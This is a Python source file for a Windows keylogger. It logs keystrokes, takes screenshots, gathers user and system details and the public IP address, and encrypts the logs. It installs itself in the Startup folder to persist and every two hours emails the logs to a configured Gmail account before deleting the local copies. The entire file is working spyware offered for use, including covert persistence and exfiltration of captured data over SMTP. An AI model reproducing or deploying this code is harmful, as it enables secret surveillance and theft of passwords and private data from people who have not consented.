import os
import time
import shutil
import datetime
import platform
import requests
import pyautogui
import pynput
import smtplib
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener


class Keylogger():

    def __init__(self):

        #Fernet Key
        self.FernetKey = "3F5_MIT38NjguwKLSztfCdeoOYPOMi3NKK0rEGCrlSg="

        #Log settings
        self.Path = r"C:\Users\Public\Documents\Log" # Path to locally stored log files
        self.LogFile = "log.txt"                     # Keylogs filename
        self.SystemInfo = "systeminfo.txt"           # SystemInfo filename
        self.ScreenFile = "screenlog"                # Screenshot filename

        #Email settings
        self.Email = "example@gmail.com"      # Your Email (Sender)
        self.Password = "pass"              # Your Password (Sender)
        self.ToEmail = self.Email                    # Email (Recipient)
        self.Subject = "subject example"             # Email Subject
        self.Body = "body example"                   # Email Body

        #Other settings
        self.CharForLine = 30                        # Number of keys pressed in a log line
        self.ScreenKey = Key.enter                   # Screenshot key
        self.CloseKey = Key.alt_gr                   # Stop script key

        #Other Variables                             
        self.Keys = []                               # DO NOT EDIT THIS
        self.KeysCount = 0                           # DO NOT EDIT THIS
        self.ScreenCount = 1                         # DO NOT EDIT THIS


    #SETUP FUNCTIONS

    def startup(self):
        """
        Add the script to Startup Programs
        """
        ToPath = r"C:\Users\\"+ os.getlogin() +r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" 
        
        if not __file__ in os.listdir(ToPath):
            shutil.copy(__file__, ToPath)

    def create_path(self):
        """
        Create logs path if it doesn't exist and switch to it.
        """
        if not os.path.isdir(self.Path):
            os.mkdir(self.Path)
        os.chdir(self.Path)
            

    #LOGS FUNCTIONS

    def encrypt(self, string):
        """
        Encrypt the string using Fernet module.
        """
        f = Fernet(self.FernetKey)

        encoded = string.encode()
        encrypted = f.encrypt(encoded)

        x = str(encrypted).replace("'", "")
        output = x[1:]
       
        return output

    def write_log(self, file, string):
        """
        Open selected file, send string to encrypt function and write it on file.
        """
        with open(file, "a") as logfile:
            line = self.encrypt(string)
            logfile.write(line + "\n")


    def delete_log(self):
        """
        Delete all log files
        """
        for filename in os.listdir(f"{self.Path}"):
            try: os.remove(filename)
            except: pass


    #INFORMATION FUNCTIONS

    def get_data(self):
        """
        Gets username, public IP, machine, version, system and processor 
        from the the computer.
        """

        data = ["User: " + os.getlogin(),
                "Machine: " + platform.machine(),
                "Version: " + platform.version(),
                "System: " + platform.system(),
                "Processor: " + platform.processor(),
                "IP Address: " + requests.get("https://api.ipify.org/").text.strip()]

        return data

    def get_time(self):
        """
        Returns a string with time set in the computer.
        """
        return "["+ str(datetime.datetime.now()) +"] "

    def get_screenshot(self):
        """
        Take a screenshot and save it in logs folder.
        """
        name = f"{self.ScreenFile}{self.ScreenCount}"
        screenshot = pyautogui.screenshot()
        screenshot.save(f"{self.Path}\\{name}.png")

        self.ScreenCount += 1
        message = self.get_time() + f"[+] Screenshot: {name}"
        self.write_log(self.LogFile, message)


    #EMAIL FUNCTION

    def send_logs(self, timer=True):
        """
        Send all log files (system.txt, keylog.txt, screenshot.png) to the email.
        If an error occurs the function waits a minute and tries again.
        Then the functions starts another timer using threading module.
        """

        if timer:
            T = threading.Timer(7200, self.send_logs)
            T.start()

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.Email, self.Password)


            msg = MIMEMultipart()
            msg['From'] = self.Email
            msg['To'] = self.ToEmail
            msg['Subject'] = self.Subject

            msg.attach(MIMEText(self.Body,"plain"))

            for filename in os.listdir(f"{self.Path}"):

                attachment = open(filename,"rb")
                part = MIMEBase("application","octet-stream")
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition","attachment; filename= " + filename)
                msg.attach(part)
                text = msg.as_string()

            server.sendmail(self.Email,self.ToEmail,text)
            self.delete_log()

        except Exception as e:
            print(e)
            time.sleep(60)
            self.send_logs()  
        finally:
            server.quit()


    #KEYLOGGING FUNCTIONS

    def on_press(self, key_pressed):
        """
        Record key and when it was pressed and send them to write_log function 
        """
        
        self.Keys.append(key_pressed)
        self.KeysCount += 1

        if self.KeysCount >= self.CharForLine:

            line = ""

            for i in self.Keys:
                k = str(i).replace("'", "")

                if len(k) > 1:
                    line += " ["+k+"] "
                else:
                    line += k

            string = self.get_time() + line
            self.write_log(self.LogFile, string)

            self.Keys = []
            self.KeysCount = 0


    def on_release(self, key_pressed):
        """
        Check the key on release.
        """
        if key_pressed == self.ScreenKey:
            self.get_screenshot()

        if key_pressed == self.CloseKey:
            return False


    #MAIN

    def run(self):

        #Add to startup
        self.startup()

        #Create logs path
        self.create_path()

        #Write systemlog file
        for line in self.get_data():
            self.write_log(self.SystemInfo, line)

        #Keylogging
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

        #Send and destroy latest logs
        K.send_logs(False)

        #Killing all Timer Threads
        for thread in threading.enumerate():
            if thread != threading.main_thread():
                thread.cancel()



if __name__ == "__main__":
    
    K = Keylogger()

    T = threading.Timer(7200, K.send_logs)
    T.start()

    K.run()
